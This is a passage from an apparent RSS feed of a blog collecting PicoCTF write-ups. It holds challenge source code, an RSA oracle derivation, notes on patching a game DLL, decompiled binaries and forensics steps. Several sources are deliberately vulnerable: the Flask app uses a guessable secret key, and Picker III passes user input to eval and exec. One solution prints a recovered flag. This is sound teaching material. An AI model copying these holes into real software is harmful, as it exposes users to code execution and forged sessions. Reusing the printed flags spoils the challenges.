from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open("./flag").read().rstrip() title = "Most Cookies" cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] app.secret_key = random.choice(cookie_names) @app.route("/") def main(): if session.get("very_auth"): check = session["very_auth"] if check == "blank": return render_template("index.html", title=title) else: return make_response(redirect("/display")) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/search", methods=["GET", "POST"]) def search(): if "name" in request.form and request.form["name"] in cookie_names: resp = make_response(redirect("/display")) session["very_auth"] = request.form["name"] return resp else: message = "That doesn't appear to be a valid cookie." category = "danger" flash(message, category) resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/reset") def reset(): resp = make_response(redirect("/")) session.pop("very_auth", None) return resp @app.route("/display", methods=["GET"]) def flag(): if session.get("very_auth"): check = session["very_auth"] if check == "admin": resp = make_response(render_template("flag.html", value=flag_value, title=title)) return resp flash("That is a cookie! Not very special though...", "success") return render_template("not-flag.html", title=title, cookie_name=session["very_auth"]) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp if __name__ == "__main__": app.run() :::</description></item><item><title>PicoCTF - mus1c</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---mus1c/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---mus1c/index.html</guid><description>PicoCTF - mus1c tags: PicoCTF CTF General Skill Source code :::spoiler Lyrics
Pico's a CTFFFFFFF my mind is waitin It's waitin Put my mind of Pico into This my flag is not found put This into my flag put my flag into Pico shout Pico shout Pico shout Pico My song's something put Pico into This Knock This down, down, down put This into CTF shout CTF my lyric is nothing Put This without my song into my lyric Knock my lyric down, down, down shout my lyric Put my lyric into This Put my song with This into my lyric Knock my lyric down shout my lyric Build my lyric up, up ,up shout my lyric shout Pico shout It Pico CTF is fun security is important Fun is fun Put security with fun into Pico CTF Build Fun up shout fun times Pico CTF put fun times Pico CTF into my song build it up shout it shout it build it up, up shout it shout Pico :::</description></item><item><title>PicoCTF - New Caesar</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html</guid><description>PicoCTF - New Caesar tags: PicoCTF CTF Crypto Challenge: New Caesar
Source code ::: spoiler source code
import string LOWERCASE_OFFSET = ord("a") ALPHABET = string.ascii_lowercase[:16] def b16_encode(plain): enc = "" for c in plain: binary = "{0:08b}".format(ord(c)) enc += ALPHABET[int(binary[:4], 2)] enc += ALPHABET[int(binary[4:], 2)] return enc def shift(c, k): t1 = ord(c) - LOWERCASE_OFFSET t2 = ord(k) - LOWERCASE_OFFSET return ALPHABET[(t1 + t2) % len(ALPHABET)] flag = "redacted" key = "redacted" assert all([k in ALPHABET for k in key]) assert len(key) == 1 b16 = b16_encode(flag) enc = "" for i, c in enumerate(b16): enc += shift(c, key[i % len(key)]) print(enc) :::</description></item><item><title>PicoCTF - No Padding, No Problem</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html</guid><description>PicoCTF - No Padding, No Problem tags: PicoCTF CTF Crypto Description Oracles can be your best friend, they will decrypt anything, except the flag’s ciphertext. How will you break it? Connect with nc mercury.picoctf.net 10333.
Hint What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all…
Recon We can try to decrypt ciphertext directly.
ciphertext: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Give me ciphertext to decrypt: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Will not decrypt the ciphertext. Try Again Exploit We know that $Enc(m_1) * Enc(m_2) = ((m_1^e) * (m_2^e))\ mod\ n = (m_1 * m_2)^e\ mod\ n = Enc(m_1 * m_2)$ $$ c’ = 2^e\ (mod\ n)*c \ \begin{align} m’ &amp;= {c’}^d\ (mod\ n) \ &amp;= 2^{ed}*c^d\ (mod\ n) \ &amp;= 2 * c^d\ (mod\ n) \ \end{align}\ m = m’ // 2 $$</description></item><item><title>PicoCTF - No way out</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</guid><description>PicoCTF - No way out Background C Sharp / dn.spy / cheat engine
Recon 大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag
Exploit Method 1 - Change .dll 可以看到No way out/pico_Data/Managed/Assembly-CSharp.dll可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的
在APTX class中，一個Mysterious的member，而且當collision.gameObject == this.player是true的時候，this.Mysterious.SetActive(true);就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把this.Mysterious.SetActive(true);設定成true，是不是就可以直接拿直到flag? Implementation 直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的 Method 2 - Change .dll 當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下EvolveGames/PlayerController/Update()這個method，其中的第51行
if (Input.GetButton("Jump") &amp;&amp; this.canMove &amp;&amp; this.characterController.isGrounded &amp;&amp; !this.isClimbing) { this.moveDirection.y = this.jumpSpeed; } 如果改成</description></item><item><title>PicoCTF - not crypto</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</guid><description>PicoCTF - not crypto Source code :::spoiler IDA Pseudo Source COde
__int64 __fastcall main(int a1, char **a2, char **a3) { __int128 *v4; // rax unsigned __int8 v5; // di unsigned __int8 v6; // si unsigned __int8 v7; // cl unsigned __int8 v8; // dl unsigned int v9; // r8d unsigned __int8 v10; // r11 int v16; // eax __int64 v17; // rdx unsigned int v18; // r12d char *v20; // r15 unsigned __int8 v25; // r8 int v30; // esi unsigned __int8 v32; // r12 unsigned __int8 v36; // r14 unsigned __int8 v38; // dl unsigned __int8 v40; // cl char v42; // r12 char v43; // r14 char v44; // al __int64 v45; // r13 unsigned __int8 v46; // r10 unsigned __int8 v47; // bp unsigned __int8 v48; // bl unsigned __int8 v49; // r8 unsigned __int8 v50; // r11 char v51; // dl char v54; // r10 __int64 v63; // rdx char v72; // al unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh] unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh] int v86; // [rsp+Ch] [rbp-1FCh] int v87; // [rsp+10h] [rbp-1F8h] unsigned __int8 v88; // [rsp+14h] [rbp-1F4h] unsigned __int8 v89; // [rsp+15h] [rbp-1F3h] unsigned __int8 v90; // [rsp+16h] [rbp-1F2h] unsigned __int8 v91; // [rsp+17h] [rbp-1F1h] unsigned __int8 v92; // [rsp+18h] [rbp-1F0h] unsigned __int8 v93; // [rsp+19h] [rbp-1EFh] unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh] unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh] unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh] char v97; // [rsp+1Dh] [rbp-1EBh] char *v98; // [rsp+20h] [rbp-1E8h] unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh] char v100; // [rsp+50h] [rbp-1B8h] char v101; // [rsp+52h] [rbp-1B6h] char v102; // [rsp+54h] [rbp-1B4h] char v103; // [rsp+56h] [rbp-1B2h] char v104; // [rsp+58h] [rbp-1B0h] char v105; // [rsp+5Ah] [rbp-1AEh] char v106; // [rsp+5Ch] [rbp-1ACh] char v107; // [rsp+5Eh] [rbp-1AAh] __int128 v108; // [rsp+60h] [rbp-1A8h] char ptr[64]; // [rsp+70h] [rbp-198h] BYREF __int128 v110; // [rsp+B0h] [rbp-158h] BYREF char v111; // [rsp+C0h] [rbp-148h] BYREF char v112[15]; // [rsp+150h] [rbp-B8h] BYREF __int128 v113; // [rsp+160h] [rbp-A8h] __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF char v116; // [rsp+1C0h] [rbp-48h] BYREF unsigned __int64 v117; // [rsp+1C8h] [rbp-40h] v117 = __readfsqword(0x28u); puts("I heard you wanted to bargain for a flag... whatcha got?"); __asm { vmovdqa xmm0, cs:xmmword_21A0 } v4 = &amp;v110; v5 = -104; v6 = 50; v7 = 108; v8 = 28; __asm { vmovdqa [rsp+208h+var_158], xmm0 } v9 = 4; do { if ( (v9 &amp; 3) == 0 ) { v10 = byte_20A0[v6]; v6 = byte_20A0[v7]; v7 = byte_20A0[v8]; v8 = byte_20A0[v5]; v5 = byte_2080[v9 >> 2] ^ v10; } v5 ^= *v4; ++v9; v4 = (v4 + 4); v6 ^= *(v4 - 3); v7 ^= *(v4 - 2); v8 ^= *(v4 - 1); *(v4 + 12) = v5; *(v4 + 13) = v6; *(v4 + 14) = v7; *(v4 + 15) = v8; } while ( v9 != 44 ); __asm { vmovdqa xmm0, cs:xmmword_21B0 vmovdqa [rsp+208h+var_A8], xmm0 } fread(ptr, 1uLL, 0x40uLL, stdin); __asm { vmovdqa xmm0, cs:xmmword_21C0 vmovdqa [rsp+208h+var_88], xmm0 vmovdqa xmm0, cs:xmmword_21D0 } v108 = v110; __asm { vmovdqa [rsp+208h+var_78], xmm0 vmovdqa xmm0, cs:xmmword_21E0 vmovdqa [rsp+208h+var_68], xmm0 vmovdqa xmm0, cs:xmmword_21F0 vmovdqa [rsp+208h+var_58], xmm0 } v100 = v112[0]; v101 = v112[2]; v102 = v112[4]; v103 = v112[6]; v104 = v112[8]; v105 = v112[10]; v106 = v112[12]; v107 = v112[14]; v98 = v115; v16 = 16; do { if ( v16 == 16 ) { v20 = &amp;v111; __asm { vmovdqa xmm4, [rsp+208h+var_A8] } LOBYTE(v87) = byte_20A0[(v113 ^ v108)]; __asm { vpextrb rax, xmm4, 4 } LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)]; v94 = byte_20A0[BYTE8(v113) ^ BYTE8(v108)]; __asm { vpextrb rax, xmm4, 0Ch } v93 = byte_20A0[(BYTE12(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 1 } v25 = byte_20A0[(BYTE1(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 5 } v85 = byte_20A0[(BYTE5(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 9 } v84 = byte_20A0[(BYTE9(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Dh } v92 = byte_20A0[(BYTE13(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 2 } LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 6 } v32 = byte_20A0[(BYTE6(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Ah } v91 = byte_20A0[(BYTE10(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Eh } v96 = v32; v88 = v25; v90 = byte_20A0[(BYTE14(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 3 } v36 = byte_20A0[(BYTE3(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 7 } v95 = v36; v38 = byte_20A0[(BYTE7(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Bh } v40 = byte_20A0[(BYTE11(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Fh } v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)]; do { v42 = v91 ^ v89 ^ v87 ^ v85; v99 = v87 ^ v89; v43 = v90 ^ v95 ^ v86 ^ v84; v97 = v30 ^ v38 ^ v94 ^ v92; v44 = v40 ^ v96 ^ v93 ^ v88; v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) >> 7)) ^ v95 ^ v43 ^ v20[7]); v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) >> 7)) ^ (2 * (v30 ^ v38)); v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) >> 7)); v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) >> 7)); v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) >> 7)) ^ (2 * (v40 ^ v96)); v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) >> 7)); LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) >> 7)) ^ v42 ^ *v20 ^ v87)]; LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) >> 7)) ^ v86 ^ v43 ^ v20[4])]; v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) >> 7)) ^ v94 ^ v97 ^ v20[8])]; v93 = byte_20A0[((27 * ((v93 ^ v88) >> 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)]; v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) >> 7)) ^ v85 ^ v42 ^ v20[1])]; v85 = byte_20A0[((27 * ((v84 ^ v90) >> 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])]; v84 = byte_20A0[((27 * ((v30 ^ v92) >> 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)]; v92 = byte_20A0[v48]; v51 = v91 ^ v42 ^ v20[2]; v20 += 16; v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) >> 7)) ^ v51)]; v96 = byte_20A0[((27 * ((v90 ^ v95) >> 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)]; v91 = byte_20A0[v46]; v90 = byte_20A0[v49]; v40 = byte_20A0[v47]; v38 = byte_20A0[v45]; v95 = byte_20A0[((27 * (v99 >> 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))]; v89 = byte_20A0[v50]; } while ( v112 != v20 ); LOBYTE(v30) = v105 ^ v30; LOBYTE(v87) = v100 ^ v87; _R15D = v30; __asm { vmovd xmm5, r15d } v54 = v86; LOBYTE(v86) = v103 ^ v90; _R9D = (v101 ^ v91); _R10D = (v102 ^ v54); _EDX = (v107 ^ v96); _R13D = (v104 ^ v94); __asm { vmovd xmm4, edx vmovd xmm7, r9d vpinsrb xmm5, xmm5, ebx, 1 vmovd xmm3, r10d } v63 = 15LL; _ESI = (v106 ^ v93); __asm { vmovd xmm1, r13d vmovd xmm0, [rsp+208h+var_1F8] vmovd xmm6, [rsp+208h+var_1FC] vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1 vpinsrb xmm0, xmm0, eax, 1 vpinsrb xmm1, xmm1, r11d, 1 vpunpcklwd xmm0, xmm0, xmm7 } v72 = HIBYTE(v113); __asm { vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1 vpunpcklwd xmm1, xmm1, xmm5 vpunpcklwd xmm3, xmm3, xmm6 vmovd xmm2, esi vpunpckldq xmm0, xmm0, xmm3 vpinsrb xmm2, xmm2, r8d, 1 vpinsrb xmm4, xmm4, ecx, 1 vpunpcklwd xmm2, xmm2, xmm4 vpunpckldq xmm1, xmm1, xmm2 vpunpcklqdq xmm0, xmm0, xmm1 vmovdqa [rsp+208h+var_98], xmm0 } if ( HIBYTE(v113) != 0xFF ) goto LABEL_14; v72 = BYTE14(v113); HIBYTE(v113) = 0; v63 = 14LL; if ( BYTE14(v113) != 0xFF ) goto LABEL_14; v72 = BYTE13(v113); BYTE14(v113) = 0; v63 = 13LL; if ( BYTE13(v113) != 0xFF ) goto LABEL_14; v72 = BYTE12(v113); BYTE13(v113) = 0; v63 = 12LL; if ( BYTE12(v113) != 0xFF ) goto LABEL_14; v72 = BYTE11(v113); BYTE12(v113) = 0; v63 = 11LL; if ( BYTE11(v113) != 0xFF ) goto LABEL_14; v72 = BYTE10(v113); BYTE11(v113) = 0; v63 = 10LL; if ( BYTE10(v113) != 0xFF ) goto LABEL_14; v72 = BYTE9(v113); BYTE10(v113) = 0; v63 = 9LL; if ( BYTE9(v113) != 0xFF ) goto LABEL_14; v72 = BYTE8(v113); BYTE9(v113) = 0; v63 = 8LL; if ( BYTE8(v113) != 0xFF ) goto LABEL_14; v72 = BYTE7(v113); BYTE8(v113) = 0; v63 = 7LL; if ( BYTE7(v113) != 0xFF ) goto LABEL_14; v72 = BYTE6(v113); BYTE7(v113) = 0; v63 = 6LL; if ( BYTE6(v113) != 0xFF ) goto LABEL_14; v72 = BYTE5(v113); BYTE6(v113) = 0; v63 = 5LL; if ( BYTE5(v113) != 0xFF ) goto LABEL_14; v72 = BYTE4(v113); BYTE5(v113) = 0; v63 = 4LL; if ( BYTE4(v113) != 0xFF ) goto LABEL_14; v72 = BYTE3(v113); BYTE4(v113) = 0; v63 = 3LL; if ( BYTE3(v113) != 0xFF ) goto LABEL_14; v72 = BYTE2(v113); BYTE3(v113) = 0; v63 = 2LL; if ( BYTE2(v113) != 0xFF ) goto LABEL_14; v72 = BYTE1(v113); BYTE2(v113) = 0; v63 = 1LL; if ( BYTE1(v113) == 0xFF &amp;&amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) ) { LOBYTE(v113) = 0; v16 = 0; } else { LABEL_14: *(&amp;v113 + v63) = v72 + 1; v16 = 0; } } v17 = v16++; *v98++ ^= *(&amp;v115[-1] + v17); } while ( &amp;v116 != v98 ); v18 = memcmp(v115, ptr, 0x40uLL); if ( v18 ) { v18 = 1; puts("Nope, come back later"); } else { puts("Yep, that's it!"); } return v18; } :::</description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</guid><description>PicoCTF - notepad Background Flask實作_基礎_03_簡述url_for與route werkzeug.url_fix
Source code Recon Exploit Reference</description></item><item><title>PicoCTF - NSA Backdoor</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html</guid><description>PicoCTF - NSA Backdoor tags: PicoCTF CTF Crypto Background Baby Step Giant Step - BSGS
用来解决如下方程最小正整數解的 $A^x\equiv B(mod\ C)$，其中$0\le x\lt C$ 如果$A\ge C, B\ge C$，那麼我們可以先取模，即$A% = C, B% = C$，所以在這裡我們只討論$0\le A, B\lt C$的情況。 普通的BSGS的步驟是這樣的：
首先確定$x$的下限是$0$，上限是$C$，我們令$M=\lceil C\rceil$ 把$A^0~A^M\ mod\ C$的值存到一个Hash表裡面 把$(A^M)^0~(A^M)^M\ mod\ C$的值一一枚舉出來，每枚舉一個就在Hash表裡面尋找是否有一個$val$值滿足$val \cdot (A^M)^i\ mod\ C=B$，如果有則找到答案，否則繼續 最終答案就是$i\cdot M+val$的值對應的原來$A$的冪 上面是普通Baby Step Giant Step的步驟，比較簡單，只適用為素數的情況。如果為合數呢？ 拓展的過程詳見全文
離散對數問題 - pohlig-hellman算法講解
需要注意的是，pohlig-hellman算法的覆雜度在一般情況下比BSGS高！ 因此，使用pohlig-hellman的場合只能是較為特殊的情況，即:$p$是質數，且$p-1$包含的質因子較少&amp;較小。
和BSGS算法一樣，pohlig-hellman算法也是用於解決離散對數問題（也有很多文獻提到是解決橢圓曲線之類的）。即給定$a,b,p$,求 $a^x \equiv b(mod\ p)$。
歐拉定理: 若$(a,p)=1$，那麽$a^{φ(p)} \equiv1(mod\ p)······(*)$ 證明略。
費馬小定理: 如果$p$是質數，那$φ(p)=p-1$。</description></item><item><title>PicoCTF - Operation Oni</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html</guid><description>PicoCTF - Operation Oni Background How to View Your SSH Keys in Linux, macOS and Windows
ISO和IMG有哪些區別
ISO和IMG的區別 ISO和IMG都是操作系統鏡像文件的擴展名，它們的主要區別在以下幾個方面：
來源不同 ISO文件通常來自光盤鏡像，例如Windows安裝光盤的ISO鏡像文件。而IMG文件可以來自多種渠道，例如從移動設備制造商下載的Android操作系統鏡像文件，或者是從虛擬機軟件中制作的虛擬機磁盤鏡像文件。 文件格式不同 ISO文件使用ISO 9660標準格式，而IMG文件可以使用多種格式，例如RAW、VMDK、VDI等。 兼容性不同 ISO文件在各種操作系統和軟件中都有良好的兼容性，而IMG文件在一些操作系統或軟件中可能存在兼容性問題。 使用範圍不同 ISO文件主要用於制作光盤或者USB啟動盤，用於安裝操作系統或者救援系統等。而IMG文件主要用於移動設備或者虛擬機等環境下的操作系統安裝或備份。 總之，ISO和IMG都是操作系統鏡像文件的擴展名，雖然它們在一些方面有類似之處，但在來源、文件格式、兼容性和使用範圍等方面存在差異，應根據具體的需求來選擇使用哪種格式。 Description Download this disk image, find the key and log into the remote machine. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.
Download disk image Remote machine: ssh -i key_file -p 59801 ctf-player@saturn.picoctf.net Recon 這一題和DF有關，主要就是分析拿到的img file，可以用Autopsy之類的分析軟體</description></item><item><title>PicoCTF - Operation Orchid</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html</guid><description>PicoCTF - Operation Orchid Recon 這一題過於簡單
Exploit - Forensics / Openssl Find Encryption Flag File(Autopsy) 可以在/root中找到，然後.ash_history的command紀錄中知道加密的password phrase touch flag.txt nano flag.txt apk get nano apk --help apk add nano nano flag.txt openssl openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567 shred -u flag.txt ls -al halt Script
$ openssl aes-256-cbc -in flag.txt.enc -d enter aes-256-cbc decryption password: *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. bad decrypt 140342062343488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto/evp/evp_enc.c:612: picoCTF{h4un71ng_p457_5113beab}%</description></item><item><title>PicoCTF - OTP Implementation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</guid><description>PicoCTF - OTP Implementation Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // al char v5; // dl unsigned int v6; // eax int i; // [rsp+18h] [rbp-E8h] int j; // [rsp+1Ch] [rbp-E4h] char input_key[112]; // [rsp+20h] [rbp-E0h] BYREF char tmp_key[104]; // [rsp+90h] [rbp-70h] BYREF unsigned __int64 v11; // [rsp+F8h] [rbp-8h] v11 = __readfsqword(0x28u); if ( argc > 1 ) { strncpy(input_key, argv[1], 0x64uLL); input_key[100] = 0; for ( i = 0; valid_char(input_key[i]); ++i )// 確認字元是否在[0-9|a-f]之間 { if ( i ) { v4 = jumble(input_key[i]); v5 = tmp_key[i - 1] + v4; v6 = ((tmp_key[i - 1] + v4) >> 31) >> 28; tmp_key[i] = ((v6 + v5) &amp; 0xF) - v6; } else { tmp_key[0] = jumble(input_key[0]) % 16; } } for ( j = 0; j &lt; i; ++j ) tmp_key[j] += 0x61; if ( i == 100 &amp;&amp; !strncmp( tmp_key, "bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe", 100uLL) ) { puts("You got the key, congrats! Now xor it with the flag!"); return 0; } else { puts("Invalid key!"); return 1; } } else { printf("USAGE: %s [KEY]\n", *argv); return 1; } } :::</description></item><item><title>PicoCTF - Picker III</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</guid><description>PicoCTF - Picker III Source code :::spoiler Source Code
import re USER_ALIVE = True FUNC_TABLE_SIZE = 4 FUNC_TABLE_ENTRY_SIZE = 32 CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it' func_table = '' def reset_table(): global func_table # This table is formatted for easier viewing, but it is really one line func_table = \ '''\ print_table \ read_variable \ write_variable \ getRandomNumber \ ''' def check_table(): global func_table if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE): return False return True def get_func(n): global func_table # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Get function name from table func_name = '' func_name_offset = n * FUNC_TABLE_ENTRY_SIZE for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE): if( func_table[i] == ' '): func_name = func_table[func_name_offset:i] break if( func_name == '' ): func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE] return func_name def print_table(): # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return for i in range(0, FUNC_TABLE_SIZE): j = i + 1 print(str(j)+': ' + get_func(i)) def filter_var_name(var_name): r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name) if r: return True else: return False def read_variable(): var_name = input('Please enter variable name to read: ') if( filter_var_name(var_name) ): eval('print('+var_name+')') else: print('Illegal variable name') def filter_value(value): if ';' in value or '(' in value or ')' in value: return False else: return True def write_variable(): var_name = input('Please enter variable name to write: ') if( filter_var_name(var_name) ): value = input('Please enter new value of variable: ') if( filter_value(value) ): exec('global '+var_name+'; '+var_name+' = '+value) else: print('Illegal value') else: print('Illegal variable name') def call_func(n): """ Calls the nth function in the function table. Arguments: n: The function to call. The first function is 0. """ # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Check n if( n &lt; 0 ): print('n cannot be less than 0. Aborting...') return elif( n >= FUNC_TABLE_SIZE ): print('n cannot be greater than or equal to the function table size of '+FUNC_TABLE_SIZE) return # Get function name from table func_name = get_func(n) # Run the function eval(func_name+'()') def dummy_func1(): print('in dummy_func1') def dummy_func2(): print('in dummy_func2') def dummy_func3(): print('in dummy_func3') def dummy_func4(): print('in dummy_func4') def getRandomNumber(): print(4) # Chosen by fair die roll. # Guaranteed to be random. # (See XKCD) def win(): # This line will not work locally unless you create your own 'flag.txt' in # the same directory as this script flag = open('flag.txt', 'r').read() #flag = flag[:-1] flag = flag.strip() str_flag = '' for c in flag: str_flag += str(hex(ord(c))) + ' ' print(str_flag) def help_text(): print( ''' This program fixes vulnerabilities in its predecessor by limiting what functions can be called to a table of predefined functions. This still puts the user in charge, but prevents them from calling undesirable subroutines. * Enter 'quit' to quit the program. * Enter 'help' for this text. * Enter 'reset' to reset the table. * Enter '1' to execute the first function in the table. * Enter '2' to execute the second function in the table. * Enter '3' to execute the third function in the table. * Enter '4' to execute the fourth function in the table. Here's the current table: ''' ) print_table() reset_table() while(USER_ALIVE): choice = input('==> ') if( choice == 'quit' or choice == 'exit' or choice == 'q' ): USER_ALIVE = False elif( choice == 'help' or choice == '?' ): help_text() elif( choice == 'reset' ): reset_table() elif( choice == '1' ): call_func(0) elif( choice == '2' ): call_func(1) elif( choice == '3' ): call_func(2) elif( choice == '4' ): call_func(3) else: print('Did not understand "'+choice+'" Have you tried "help"?') :::</description></item><item><title>PicoCTF - Pitter, Patter, Platters</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html</guid><description>PicoCTF - Pitter, Patter, Platters tags: PicoCTF CTF Misc Challenge: Pitter, 